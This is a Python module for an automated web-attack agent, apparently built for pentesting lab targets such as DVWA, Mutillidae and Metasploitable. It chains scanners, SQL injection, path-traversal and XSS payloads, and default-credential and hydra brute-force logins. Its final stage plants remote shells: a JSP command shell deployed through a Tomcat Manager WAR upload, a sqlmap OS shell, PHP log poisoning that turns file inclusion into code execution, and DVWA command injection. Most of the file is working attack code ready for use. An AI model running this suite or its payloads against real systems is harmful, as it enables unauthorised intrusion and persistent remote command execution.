"""
webagent.py — Web Application Attack Agent

Autonomously tests web targets for common vulnerabilities.
Triggered automatically when HTTP/S ports are found during recon,
or manually via --url flag.

Attack modules:
    1. Tech fingerprint  — headers, server, frameworks, CMS detection
    2. Directory bruteforce — gobuster against common wordlists
    3. Nikto scan        — automated web vulnerability scanner
    4. SQLi testing      — sqlmap against discovered endpoints
    5. LFI/RFI testing   — path traversal on parameters
    6. XSS testing       — reflected XSS on parameters
    7. Default creds     — common admin panels with default passwords
"""

import subprocess
import requests
import re
import os
import tempfile
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin
from banner import status, success, warn, error


# ── Data structures ───────────────────────────────────────────────────────────

@dataclass
class WebFindings:
    """Structured findings from web application testing."""
    url: str
    server: str = ""
    technologies: list = field(default_factory=list)
    directories: list = field(default_factory=list)
    interesting_files: list = field(default_factory=list)
    nikto_findings: list = field(default_factory=list)
    sqli_findings: list = field(default_factory=list)
    lfi_findings: list = field(default_factory=list)
    xss_findings: list = field(default_factory=list)
    default_cred_findings: list = field(default_factory=list)
    raw_output: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "url": self.url,
            "server": self.server,
            "technologies": self.technologies,
            "directories": self.directories,
            "interesting_files": self.interesting_files,
            "nikto_findings": self.nikto_findings,
            "sqli_findings": self.sqli_findings,
            "lfi_findings": self.lfi_findings,
            "xss_findings": self.xss_findings,
            "default_cred_findings": self.default_cred_findings,
        }

    def has_findings(self) -> bool:
        return any([
            self.nikto_findings, self.sqli_findings,
            self.lfi_findings, self.xss_findings,
            self.default_cred_findings, self.interesting_files,
        ])

    def summary(self) -> str:
        lines = [
            f"URL:              {self.url}",
            f"Server:           {self.server}",
            f"Technologies:     {', '.join(self.technologies) if self.technologies else 'unknown'}",
            f"Directories:      {len(self.directories)} found",
            f"Interesting files:{len(self.interesting_files)} found",
            f"Nikto findings:   {len(self.nikto_findings)}",
            f"SQLi findings:    {len(self.sqli_findings)}",
            f"LFI findings:     {len(self.lfi_findings)}",
            f"XSS findings:     {len(self.xss_findings)}",
            f"Default creds:    {len(self.default_cred_findings)}",
        ]
        if self.sqli_findings:
            lines.append("SQLi:")
            for f in self.sqli_findings[:3]:
                lines.append(f"  [CRITICAL] {f}")
        if self.lfi_findings:
            lines.append("LFI:")
            for f in self.lfi_findings[:3]:
                lines.append(f"  [HIGH] {f}")
        if self.xss_findings:
            lines.append("XSS:")
            for f in self.xss_findings[:3]:
                lines.append(f"  [MEDIUM] {f}")
        if self.default_cred_findings:
            lines.append("Default Creds:")
            for f in self.default_cred_findings[:3]:
                lines.append(f"  [CRITICAL] {f}")
        return "\n".join(lines)


# ── Helper ────────────────────────────────────────────────────────────────────

def _run_cmd(cmd: list, timeout: int = 120, label: str = "") -> str:
    """Run a shell command and return stdout as string."""
    if label:
        status(f"  Web: {label}")
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return (result.stdout + result.stderr).strip()
    except subprocess.TimeoutExpired:
        warn(f"  {label} timed out after {timeout}s")
        return ""
    except Exception as e:
        return f"[error] {e}"


def _safe_get(url: str, timeout: int = 10, **kwargs) -> requests.Response | None:
    """HTTP GET with error handling."""
    try:
        return requests.get(url, timeout=timeout, verify=False, **kwargs)
    except Exception:
        return None


# ── Module 1: Tech Fingerprint ────────────────────────────────────────────────

def _fingerprint(url: str, findings: WebFindings):
    """Identify server, technologies, and frameworks."""
    status("  Web: technology fingerprint")
    r = _safe_get(url)
    if not r:
        warn(f"  Could not reach {url}")
        return

    server = r.headers.get("Server", "")
    powered = r.headers.get("X-Powered-By", "")
    findings.server = server

    techs = []
    if server:
        techs.append(server)
    if powered:
        techs.append(powered)

    body = r.text.lower()
    tech_signatures = {
        "WordPress":  ["wp-content", "wp-includes", "wordpress"],
        "Joomla":     ["joomla", "/components/com_"],
        "Drupal":     ["drupal", "sites/default/files"],
        "PHP":        ["php", ".php"],
        "Apache":     ["apache"],
        "nginx":      ["nginx"],
        "Tomcat":     ["tomcat", "catalina"],
        "Django":     ["django", "csrftoken"],
        "Laravel":    ["laravel", "laravel_session"],
        "ASP.NET":    ["asp.net", "__viewstate"],
        "jQuery":     ["jquery"],
        "Bootstrap":  ["bootstrap"],
    }
    for tech, sigs in tech_signatures.items():
        if any(sig in body or sig in server.lower() for sig in sigs):
            if tech not in techs:
                techs.append(tech)

    findings.technologies = techs
    findings.raw_output["headers"] = dict(r.headers)

    # Check for common interesting paths
    interesting_paths = [
        "/robots.txt", "/sitemap.xml", "/.git/HEAD",
        "/admin", "/login", "/wp-admin", "/phpmyadmin",
        "/manager/html", "/.env", "/config.php",
        "/backup", "/test", "/dev",
    ]
    for path in interesting_paths:
        r2 = _safe_get(urljoin(url, path))
        if r2 and r2.status_code in (200, 301, 302, 403):
            findings.interesting_files.append(
                f"{path} [{r2.status_code}]"
            )


# ── Module 2: Directory Bruteforce ────────────────────────────────────────────

def _gobuster(url: str, findings: WebFindings):
    """Run gobuster directory bruteforce."""
    status("  Web: directory bruteforce (gobuster)")

    wordlist = "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        wordlist = "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
    if not os.path.exists(wordlist):
        warn("  No wordlist found, skipping gobuster")
        return

    out = _run_cmd([
        "gobuster", "dir",
        "-u", url,
        "-w", wordlist,
        "-t", "20",
        "-q",
        "--no-error",
        "-s", "200,301,302,403",
        "--timeout", "10s",
    ], timeout=120, label="gobuster")

    findings.raw_output["gobuster"] = out
    dirs = []
    for line in out.splitlines():
        if line.startswith("/") or "(Status:" in line:
            dirs.append(line.strip())
    findings.directories = dirs[:30]
    if dirs:
        success(f"  Gobuster found {len(dirs)} paths")


# ── Module 3: Nikto ───────────────────────────────────────────────────────────

def _nikto(url: str, findings: WebFindings):
    """Run nikto web vulnerability scan."""
    status("  Web: nikto scan")

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or (443 if parsed.scheme == "https" else 80)

    out = _run_cmd([
        "nikto",
        "-h", host,
        "-p", str(port),
        "-maxtime", "90s",
        "-nointeractive",
        "-Format", "txt",
    ], timeout=120, label="nikto")

    findings.raw_output["nikto"] = out
    nikto_hits = []
    for line in out.splitlines():
        if line.startswith("+") and "OSVDB" not in line:
            hit = line.lstrip("+ ").strip()
            if len(hit) > 20:
                nikto_hits.append(hit[:200])

    findings.nikto_findings = nikto_hits[:20]
    if nikto_hits:
        success(f"  Nikto found {len(nikto_hits)} issues")


# ── Module 4: SQLi Testing ────────────────────────────────────────────────────

def _sqli_test(url: str, findings: WebFindings):
    """Run sqlmap against discovered endpoints with parameters."""
    status("  Web: SQL injection testing (sqlmap)")

    # Find endpoints with parameters from gobuster + interesting files
    targets = []

    # Check common injectable endpoints on Metasploitable/DVWA
    common_sqli_paths = [
        "/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit",
        "/mutillidae/index.php?page=user-info.php&username=admin&password=admin&user-info-php-submit-button=View+Account+Details",
        "/tikiwiki/tiki-listpages.php",
        "/phpMyAdmin/",
        "/test.php?id=1",
        "/index.php?id=1",
        "/search.php?q=test",
    ]

    for path in common_sqli_paths:
        test_url = urljoin(url, path)
        r = _safe_get(test_url)
        if r and r.status_code == 200 and len(r.text) > 100:
            targets.append(test_url)

    if not targets:
        # Try the base URL
        targets = [url + "?id=1"]

    sqli_hits = []
    for target in targets[:3]:  # cap at 3 to keep runtime reasonable
        out = _run_cmd([
            "sqlmap",
            "-u", target,
            "--batch",
            "--level", "1",
            "--risk", "1",
            "--timeout", "10",
            "--retries", "1",
            "--output-dir", tempfile.mkdtemp(prefix="sqlmap_"),
            "--forms",
            "--crawl", "1",
        ], timeout=45, label=f"sqlmap → {target[:60]}")

        if any(x in out for x in ["is vulnerable", "injectable", "sqlmap identified"]):
            sqli_hits.append(f"SQLi confirmed: {target}")
        elif "parameter" in out.lower() and "payload" in out.lower():
            sqli_hits.append(f"SQLi possible: {target}")

    findings.sqli_findings = sqli_hits
    findings.raw_output["sqlmap"] = out if targets else ""


# ── Module 5: LFI Testing ─────────────────────────────────────────────────────

def _lfi_test(url: str, findings: WebFindings):
    """Test for Local File Inclusion vulnerabilities."""
    status("  Web: LFI/path traversal testing")

    lfi_payloads = [
        "../../../../etc/passwd",
        "../../../../etc/passwd%00",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "php://filter/convert.base64-encode/resource=/etc/passwd",
    ]

    lfi_params = ["page", "file", "path", "include", "doc", "document", "lang", "template"]
    lfi_hits = []

    # Test discovered paths with parameters
    test_paths = ["/dvwa/vulnerabilities/fi/?page=", "/mutillidae/index.php?page=",
                  "/index.php?page=", "/index.php?file=", "/index.php?include="]

    for path in test_paths:
        for payload in lfi_payloads[:3]:
            test_url = urljoin(url, path) + payload
            r = _safe_get(test_url)
            if r and r.status_code == 200:
                if "root:x:0:0" in r.text or "root:*:" in r.text:
                    lfi_hits.append(f"LFI confirmed — /etc/passwd readable at {path}{payload}")
                    break

    findings.lfi_findings = lfi_hits[:10]
    if lfi_hits:
        success(f"  LFI: {len(lfi_hits)} confirmed")


# ── Module 6: XSS Testing ─────────────────────────────────────────────────────

def _xss_test(url: str, findings: WebFindings):
    """Test for reflected XSS vulnerabilities."""
    status("  Web: XSS testing")

    xss_payloads = [
        "<script>alert(1)</script>",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
    ]

    xss_paths = [
        "/dvwa/vulnerabilities/xss_r/?name=",
        "/mutillidae/index.php?page=add-to-your-blog.php&blog_entry=",
        "/search.php?q=",
        "/index.php?search=",
    ]

    xss_hits = []
    for path in xss_paths:
        for payload in xss_payloads[:2]:
            test_url = urljoin(url, path) + payload
            r = _safe_get(test_url)
            if r and r.status_code == 200:
                if payload in r.text or payload.replace('"', '&quot;') in r.text:
                    xss_hits.append(f"XSS reflected at {path} — payload: {payload[:50]}")
                    break

    findings.xss_findings = xss_hits[:10]
    if xss_hits:
        success(f"  XSS: {len(xss_hits)} confirmed")


# ── Module 7: Default Credentials ─────────────────────────────────────────────

def _default_creds(url: str, findings: WebFindings):
    """Test common admin panels for default credentials."""
    status("  Web: default credential testing")

    targets = [
        # (path, username_field, password_field, username, password, success_indicator)
        ("/dvwa/login.php",        "username", "password", "admin",  "password",  "logout"),
        ("/phpMyAdmin/index.php",  "pma_username", "pma_password", "root", "", "pma_navigation"),
        ("/manager/html",          None, None, "tomcat", "tomcat", "Tomcat Manager"),
        ("/manager/html",          None, None, "admin",  "admin",  "Tomcat Manager"),
        ("/mutillidae/index.php",  "username", "password", "admin", "admin", "logout"),
    ]

    hits = []
    session = requests.Session()

    for path, user_field, pass_field, username, password, indicator in targets:
        target_url = urljoin(url, path)
        r = _safe_get(target_url)
        if not r or r.status_code not in (200, 401):
            continue

        # HTTP Basic Auth (Tomcat manager)
        if user_field is None:
            r2 = _safe_get(target_url, auth=(username, password))
            if r2 and r2.status_code == 200 and indicator.lower() in r2.text.lower():
                hits.append(f"Default creds work: {path} — {username}:{password}")
            continue

        # Form-based login
        try:
            data = {user_field: username, pass_field: password, "Login": "Login"}
            r2 = session.post(target_url, data=data, timeout=10, verify=False,
                              allow_redirects=True)
            if r2 and indicator.lower() in r2.text.lower():
                hits.append(f"Default creds work: {path} — {username}:{password}")
        except Exception:
            pass

    findings.default_cred_findings = hits[:10]
    if hits:
        success(f"  Default creds: {len(hits)} valid")


# ── Module 8: WAF Detection ──────────────────────────────────────────────────

def _wafw00f(url: str, findings: WebFindings):
    """Detect Web Application Firewall."""
    status("  Web: WAF detection (wafw00f)")
    out = _run_cmd(["wafw00f", url, "-a"], timeout=30, label="wafw00f")
    findings.raw_output["wafw00f"] = out
    waf_detected = []
    for line in out.splitlines():
        if "is behind" in line.lower() or "detected" in line.lower():
            waf_detected.append(line.strip())
    if waf_detected:
        warn(f"  WAF detected: {waf_detected[0]}")
        findings.technologies.append(f"WAF: {waf_detected[0]}")
    else:
        status("  No WAF detected")


# ── Module 9: WhatWeb Fingerprint ─────────────────────────────────────────────

def _whatweb(url: str, findings: WebFindings):
    """Deep technology fingerprinting with whatweb."""
    status("  Web: deep fingerprint (whatweb)")
    out = _run_cmd(["whatweb", "--color=never", "-a", "3", url],
                   timeout=30, label="whatweb")
    findings.raw_output["whatweb"] = out
    # Parse whatweb output for technologies
    tech_pattern = re.findall(r'\[([^\]]+)\]', out)
    for tech in tech_pattern:
        tech = tech.strip()
        if tech and tech not in findings.technologies and len(tech) < 50:
            findings.technologies.append(tech)


# ── Module 10: Feroxbuster Recursive Scan ─────────────────────────────────────

def _feroxbuster(url: str, findings: WebFindings):
    """Recursive directory and file discovery with feroxbuster."""
    status("  Web: recursive directory scan (feroxbuster)")
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        warn("  No wordlist found, skipping feroxbuster")
        return
    out = _run_cmd([
        "feroxbuster",
        "--url", url,
        "--wordlist", wordlist,
        "--threads", "20",
        "--depth", "2",
        "--silent",
        "--no-state",
        "--status-codes", "200,301,302,403",
        "--timeout", "10",
    ], timeout=120, label="feroxbuster")
    findings.raw_output["feroxbuster"] = out
    ferox_dirs = []
    for line in out.splitlines():
        match = re.search(r'(https?://\S+)', line)
        if match:
            found_url = match.group(1)
            if found_url not in findings.directories:
                ferox_dirs.append(found_url)
    findings.directories.extend(ferox_dirs[:20])
    if ferox_dirs:
        success(f"  Feroxbuster found {len(ferox_dirs)} additional paths")


# ── Module 11: Nuclei Vulnerability Scan ──────────────────────────────────────

def _nuclei(url: str, findings: WebFindings):
    """Run nuclei template-based vulnerability scanner."""
    status("  Web: nuclei vulnerability scan")
    out = _run_cmd([
        "nuclei",
        "-u", url,
        "-severity", "critical,high,medium",
        "-silent",
        "-no-color",
        "-timeout", "10",
        "-rate-limit", "50",
    ], timeout=180, label="nuclei")
    findings.raw_output["nuclei"] = out
    nuclei_hits = []
    for line in out.splitlines():
        line = line.strip()
        if line and any(sev in line.lower() for sev in ["critical", "high", "medium"]):
            nuclei_hits.append(line[:200])
    findings.nikto_findings.extend(nuclei_hits[:20])
    if nuclei_hits:
        success(f"  Nuclei found {len(nuclei_hits)} issues")


# ── Module 12: WPScan ─────────────────────────────────────────────────────────

def _wpscan(url: str, findings: WebFindings):
    """Run WPScan if WordPress is detected."""
    if not any("wordpress" in t.lower() or "wp" in t.lower()
               for t in findings.technologies):
        status("  Web: WPScan skipped (no WordPress detected)")
        return
    status("  Web: WordPress vulnerability scan (wpscan)")
    out = _run_cmd([
        "wpscan",
        "--url", url,
        "--no-banner",
        "--no-update",
        "--random-user-agent",
        "--enumerate", "vp,u,tt",
    ], timeout=120, label="wpscan")
    findings.raw_output["wpscan"] = out
    wp_hits = []
    for line in out.splitlines():
        if any(x in line for x in ["[!]", "[+]", "vulnerability", "CVE"]):
            wp_hits.append(line.strip()[:200])
    findings.nikto_findings.extend(wp_hits[:15])
    if wp_hits:
        success(f"  WPScan found {len(wp_hits)} issues")


# ── Module 13: Wfuzz Parameter Fuzzing ───────────────────────────────────────

def _wfuzz(url: str, findings: WebFindings):
    """Fuzz URL parameters for hidden endpoints."""
    status("  Web: parameter fuzzing (wfuzz)")
    wordlist = "/usr/share/wordlists/dirb/common.txt"
    if not os.path.exists(wordlist):
        warn("  No wordlist for wfuzz, skipping")
        return
    fuzz_url = url.rstrip("/") + "/FUZZ"
    out = _run_cmd([
        "wfuzz",
        "-c",
        "--hc", "404",
        "-w", wordlist,
        "-t", "20",
        "--no-color",
        fuzz_url,
    ], timeout=60, label="wfuzz")
    findings.raw_output["wfuzz"] = out
    wfuzz_hits = []
    for line in out.splitlines():
        if re.search(r'\d{3}', line) and "000" not in line[:5]:
            wfuzz_hits.append(line.strip()[:150])
    findings.directories.extend(wfuzz_hits[:10])


# ── Module 14: Hydra Credential Brute Force ───────────────────────────────────

def _hydra(url: str, findings: WebFindings):
    """Brute force web login forms with hydra."""
    status("  Web: credential brute force (hydra)")
    parsed = urlparse(url)
    host = parsed.hostname

    # Common login paths to try
    login_targets = []
    for path in ["/dvwa/login.php", "/mutillidae/index.php",
                 "/phpMyAdmin/", "/admin/", "/login.php"]:
        r = _safe_get(urljoin(url, path))
        if r and r.status_code == 200 and any(
            x in r.text.lower() for x in ["password", "passwd", "login", "username"]
        ):
            login_targets.append(path)

    if not login_targets:
        status("  No login forms found for hydra")
        return

    hydra_hits = []
    for path in login_targets[:2]:
        # Detect form fields
        r = _safe_get(urljoin(url, path))
        if not r:
            continue

        # Try common creds with hydra http-post-form
        out = _run_cmd([
            "hydra",
            "-L", "/usr/share/wordlists/metasploit/http_default_users.txt",
            "-P", "/usr/share/wordlists/metasploit/http_default_pass.txt",
            "-s", str(parsed.port or 80),
            host,
            "http-post-form",
            f"{path}:username=^USER^&password=^PASS^&Login=Login:incorrect",
            "-t", "4",
            "-f",
        ], timeout=60, label=f"hydra → {path}")

        if "[80]" in out or "login:" in out.lower():
            for line in out.splitlines():
                if "login:" in line.lower() and "password:" in line.lower():
                    hydra_hits.append(f"Hydra cracked: {path} — {line.strip()}")

    findings.default_cred_findings.extend(hydra_hits[:5])
    if hydra_hits:
        success(f"  Hydra found {len(hydra_hits)} valid credentials")


# ── Main entry point ──────────────────────────────────────────────────────────────

def run_web_agent(url: str) -> WebFindings:
    """
    Run full web application attack suite against a URL.

    Args:
        url: Target URL e.g. 'http://192.168.211.128'

    Returns:
        WebFindings dataclass with all results
    """
    # Normalize URL
    if not url.startswith("http"):
        url = "http://" + url

    findings = WebFindings(url=url)
    status(f"Web agent starting against {url}")

    _fingerprint(url, findings)
    _gobuster(url, findings)
    _nikto(url, findings)
    _sqli_test(url, findings)
    _lfi_test(url, findings)
    _xss_test(url, findings)
    _default_creds(url, findings)

    # ── Web Shell Drop ────────────────────────────────────────────────────────
    if findings.has_findings():
        status("Attempting web shell drop based on confirmed findings...")
        shell_result = run_web_shell_drop(url, findings)
        if shell_result["success"]:
            success(f"Web shell drop SUCCESS via {shell_result['method']}")
            success(f"Shell URL: {shell_result['shell_url']}?cmd=id")
            findings.raw_output["web_shell"] = shell_result
        else:
            status("Web shell drop: no method succeeded")
        success(f"Web agent complete — findings on {url}")
    else:
        status(f"Web agent complete — no critical findings on {url}")

    return findings


def web_findings_to_report_context(findings: WebFindings) -> str:
    """
    Format WebFindings as a string to inject into the report generator.

    Args:
        findings: WebFindings from run_web_agent()

    Returns:
        Formatted string for reporter.py consumption
    """
    return f"""
WEB APPLICATION ASSESSMENT RESULTS for {findings.url}:

{findings.summary()}

DIRECTORIES DISCOVERED:
{chr(10).join(findings.directories[:20]) if findings.directories else 'None'}

NIKTO FINDINGS:
{chr(10).join(findings.nikto_findings[:10]) if findings.nikto_findings else 'None'}

INTERESTING FILES:
{chr(10).join(findings.interesting_files) if findings.interesting_files else 'None'}
"""


def detect_web_targets(targets: list) -> list[str]:
    """
    Scan a targets list from recon and return URLs for any HTTP/S services found.

    Args:
        targets: List of target dicts from parse_nmap() or run_recon()

    Returns:
        List of URLs to pass to run_web_agent()
    """
    urls = []
    http_services = {"http", "https", "http-alt", "http-proxy", "ssl/http"}
    http_ports = {80, 443, 8080, 8443, 8000, 8008, 8888, 9090}

    for t in targets:
        ip = t.get("ip", "")
        for svc in t.get("services", []):
            port = int(svc.get("port", 0))
            svc_name = svc.get("service", "").lower()
            is_ssl = "ssl" in svc_name or port == 443 or port == 8443

            if svc_name in http_services or port in http_ports:
                scheme = "https" if is_ssl else "http"
                url = f"{scheme}://{ip}:{port}" if port not in (80, 443) else f"{scheme}://{ip}"
                if url not in urls:
                    urls.append(url)

    return urls


# ── Web Shell Drop ────────────────────────────────────────────────────────────

def _tomcat_war_shell(url: str, findings: WebFindings) -> str:
    """
    Upload a JSP web shell via Tomcat Manager with default creds.
    Returns shell URL if successful, empty string otherwise.
    """
    import tempfile, zipfile, os
    status("  Web shell: attempting Tomcat WAR upload")

    manager_paths = ["/manager/html", "/manager/text"]
    cred_pairs = [
        ("tomcat", "tomcat"), ("admin", "admin"),
        ("tomcat", "s3cret"), ("admin", "password"),
        ("manager", "manager"),
    ]

    jsp_shell = b"""<%@ page import="java.util.*,java.io.*"%>
<%
String cmd = request.getParameter("cmd");
if(cmd != null){
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while(disr != null){out.println(disr); disr = dis.readLine();}
}
%>"""

    for path in manager_paths:
        manager_url = urljoin(url, path)
        for username, password in cred_pairs:
            r = _safe_get(manager_url, auth=(username, password))
            if not r or r.status_code != 200:
                continue

            success(f"  Tomcat Manager access: {username}:{password}")

            # Build WAR file in memory
            tmpdir = tempfile.mkdtemp()
            war_path = os.path.join(tmpdir, "penagent_shell.war")
            with zipfile.ZipFile(war_path, 'w') as zf:
                zf.writestr("shell.jsp", jsp_shell)
                zf.writestr("WEB-INF/web.xml", b"""<?xml version="1.0"?>
<web-app xmlns="http://java.sun.com/xml/ns/javaee" version="2.5">
  <display-name>PenAgent Shell</display-name>
</web-app>""")

            # Upload WAR
            # Try multiple deploy methods for different Tomcat versions
            deploy_attempts = [
                # Tomcat 7+ text API
                ("PUT", urljoin(url, "/manager/text/deploy?path=/penagent_shell&update=true")),
                # Tomcat 5.5/6 HTML manager
                ("PUT", urljoin(url, "/manager/deploy?path=/penagent_shell&update=true")),
            ]
            for method, deploy_url in deploy_attempts:
                try:
                    with open(war_path, 'rb') as f:
                        r2 = requests.put(
                            deploy_url,
                            data=f,
                            auth=(username, password),
                            headers={"Content-Type": "application/octet-stream"},
                            verify=False,
                            timeout=15,
                        ) if method == "PUT" else None
                    if r2 and ("OK" in r2.text or "200" in r2.text):
                        shell_url = urljoin(url, "/penagent_shell/shell.jsp")
                        test = _safe_get(f"{shell_url}?cmd=id")
                        if test and ("uid=" in test.text or "root" in test.text):
                            success(f"  WAR shell deployed: {shell_url}?cmd=id")
                            findings.default_cred_findings.append(
                                f"Tomcat WAR shell deployed: {shell_url}?cmd=<command>"
                            )
                            return shell_url
                except Exception:
                    continue

    return ""


def _sqlmap_os_shell(url: str, findings: WebFindings) -> str:
    """
    Attempt to get OS shell via sqlmap --os-shell on confirmed SQLi endpoints.
    Returns endpoint if successful.
    """
    status("  Web shell: sqlmap OS shell attempt")
    if not findings.sqli_findings:
        return ""

    for sqli in findings.sqli_findings[:2]:
        # Extract URL from finding string
        import re
        url_match = re.search(r'https?://\S+', sqli)
        if not url_match:
            continue
        target = url_match.group(0)
        out = _run_cmd([
            "sqlmap",
            "-u", target,
            "--batch",
            "--os-shell",
            "--technique", "BEUSTQ",
            "--level", "1",
            "--risk", "1",
            "--timeout", "10",
            "--output-dir", tempfile.mkdtemp(prefix="sqlmap_shell_"),
        ], timeout=60, label=f"sqlmap os-shell → {target[:50]}")

        if "os-shell>" in out or "command standard output" in out.lower():
            success(f"  SQLmap OS shell obtained on {target}")
            findings.sqli_findings.append(f"OS shell via SQLmap: {target}")
            return target

    return ""


def _lfi_to_rce(url: str, findings: WebFindings) -> str:
    """
    Attempt LFI to RCE via log poisoning (Apache access log injection).
    Returns shell URL if successful.
    """
    status("  Web shell: LFI log poisoning attempt")
    if not findings.lfi_findings:
        return ""

    # Inject PHP shell into User-Agent (gets written to access log)
    php_payload = "<?php system($_GET['cmd']); ?>"
    poison_headers = {"User-Agent": php_payload}

    try:
        requests.get(url, headers=poison_headers, verify=False, timeout=5)
    except Exception:
        pass

    # Common log paths to include via LFI
    log_paths = [
        "/var/log/apache2/access.log",
        "/var/log/apache/access.log",
        "/var/log/httpd/access_log",
        "/proc/self/environ",
    ]

    lfi_paths = ["/dvwa/vulnerabilities/fi/?page=", "/index.php?page=",
                 "/index.php?file=", "/index.php?include="]

    for lfi_path in lfi_paths:
        for log_path in log_paths:
            test_url = urljoin(url, lfi_path) + log_path
            r = _safe_get(f"{test_url}&cmd=id")
            if r and "uid=" in r.text:
                success(f"  LFI→RCE via log poisoning: {test_url}&cmd=<command>")
                findings.lfi_findings.append(
                    f"LFI→RCE log poisoning confirmed: {test_url}&cmd=<command>"
                )
                return test_url

    return ""


def _dvwa_cmd_injection_shell(url: str, findings: WebFindings) -> str:
    """
    Exploit DVWA command injection page after login with default creds.
    """
    status("  Web shell: DVWA command injection attempt")

    session = requests.Session()
    login_url = urljoin(url, "/dvwa/login.php")
    r = _safe_get(login_url)
    if not r or r.status_code != 200:
        return ""

    # Login
    r2 = session.post(login_url, data={
        "username": "admin",
        "password": "password",
        "Login": "Login",
    }, verify=False, timeout=10, allow_redirects=True)

    if "logout" not in r2.text.lower():
        return ""

    # Set security to low
    session.get(urljoin(url, "/dvwa/security.php"), verify=False, timeout=5)
    session.post(urljoin(url, "/dvwa/security.php"), data={
        "security": "low", "seclev_submit": "Submit"
    }, verify=False, timeout=5)

    # Command injection
    cmd_url = urljoin(url, "/dvwa/vulnerabilities/exec/")
    r3 = session.post(cmd_url, data={
        "ip": "127.0.0.1; id",
        "Submit": "Submit",
    }, verify=False, timeout=10)

    if r3 and "uid=" in r3.text:
        success(f"  DVWA command injection confirmed — RCE as web user")
        findings.default_cred_findings.append(
            f"DVWA command injection RCE: {cmd_url} — payload: 127.0.0.1; <command>"
        )
        return cmd_url

    return ""


def run_web_shell_drop(url: str, findings: WebFindings) -> dict:
    """
    Attempt to obtain a web shell using all available methods.
    Tries in order: Tomcat WAR, SQLmap OS shell, LFI log poisoning, DVWA cmd injection.

    Args:
        url:      Target base URL
        findings: WebFindings from run_web_agent() (used to check confirmed vulns)

    Returns:
        Dict with keys: method, shell_url, success (bool)
    """
    status(f"Web shell drop starting against {url}")

    methods = [
        ("Tomcat WAR Upload",        lambda: _tomcat_war_shell(url, findings)),
        ("SQLmap OS Shell",          lambda: _sqlmap_os_shell(url, findings)),
        ("LFI Log Poisoning → RCE", lambda: _lfi_to_rce(url, findings)),
        ("DVWA Command Injection",   lambda: _dvwa_cmd_injection_shell(url, findings)),
    ]

    for method_name, method_fn in methods:
        try:
            result = method_fn()
            if result:
                success(f"Web shell obtained via {method_name}: {result}")
                return {"method": method_name, "shell_url": result, "success": True}
        except Exception as e:
            warn(f"  {method_name} failed: {e}")

    warn("Web shell drop: all methods failed")
    return {"method": None, "shell_url": None, "success": False}
